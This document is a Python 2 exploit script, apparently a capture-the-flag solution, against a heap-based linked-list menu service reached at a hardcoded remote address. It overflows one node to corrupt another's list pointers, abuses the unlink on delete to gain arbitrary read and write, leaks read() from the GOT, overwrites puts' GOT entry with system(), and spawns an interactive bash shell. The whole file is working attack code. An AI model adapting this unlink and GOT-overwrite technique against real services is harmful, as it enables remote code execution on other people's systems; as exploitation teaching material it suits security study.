from struct import pack, unpack
from socket import *
from isis import telnet_shell

read_got_addr = 0x804A000
puts_got_addr = 0x804A008

X = 1024 * 1024
local = False

if local:
    read_offset = 0x00dfc50
    system_offset = 0x00041280
else:
    read_offset = 0xc7a00
    system_offset = 0x3bf10

system_read_offset = read_offset - system_offset

s = socket()
if local:
    s.connect(('localhost', 9174))
else:
    s.connect(('54.81.149.239', 9174))

def create(size):
    s.send('1\n')
    s.recv(X)
    s.send('%i\n' % size)
    s.recv(X)
    s.recv(X)

def change(num, data, wait=True):
    s.send('3\n')
    s.recv(X)
    s.send('%i\n' % num)
    s.recv(X)
    s.send('%i\n' % len(data))
    s.recv(X)
    s.send(data)
    s.recv(X)
    s.recv(X)

def delete(num):
    s.send('2\n')
    s.recv(X)
    s.send('%i\n' % num)
    s.recv(X)
    s.recv(X)

def display(num):
    s.send('4\n')
    s.recv(X)
    s.send('%i\n' % num)
    raw = s.recv(X)
    data = raw.split('\nPlease enter one of the following')[0]
    s.recv(X)
    return data

def read_data(addr):
    change(0, pack('I', addr))
    return display(1)

def write_data(addr, data):
    change(0, pack('I', addr))
    change(1, data, False)



s.recv(X)
s.recv(X)

# Allocate n0..n4
for i in range(5):
    create(0)

# Setup our argument to system()
change(4, 'bash\0\n')

# Use n0 to overwrite n1's metadata
#      size  prev           next           data
# n1: [0   , n0           , n2           , ''  ] ->
#     [0   , node_list + 4, node_list - 4, ''  ]
change(0, 'AAAABBBBCCCC' + pack('I', 0) +  pack('I', 0x804A064) + pack('I', 0x804A05C))

# Delete n1
# One of the operations executed during this action is:
#     next_node.prev = prev
# which effectively does the following:
#     node_list[0] = node_list + 4
delete(1)

# At this point, our R/W primitive is set up!
# We can use change(0, ...) to write a target address into node_list[1]
#     display(1) reads from that address
#     change(1, ...) writes to that address

# Determine the address of read()
raw_addr = ''
for i in range(4):
    data = read_data(read_got_addr+i)
    raw_addr += data[0] if data else '\0'
read_addr = unpack('I', raw_addr)[0]

# Calculate the address of system()
system_addr = read_addr - system_read_offset

print "LIBC: " + hex(read_addr - read_offset)
print "READ: " + hex(read_addr)
print "SYSTEM: " + hex(system_addr)

# Overwrite the .got.plt entry for puts() with system()
write_data(puts_got_addr, pack('I', system_addr))

# "display()" the contents of n4
# The entry for puts() has been overwritten, so:
#     puts("bash\0\n")
# is actually:
#     system("bash\0\n")
s.send('4\n')
s.send('4\n')

print "OK!"
telnet_shell(s)
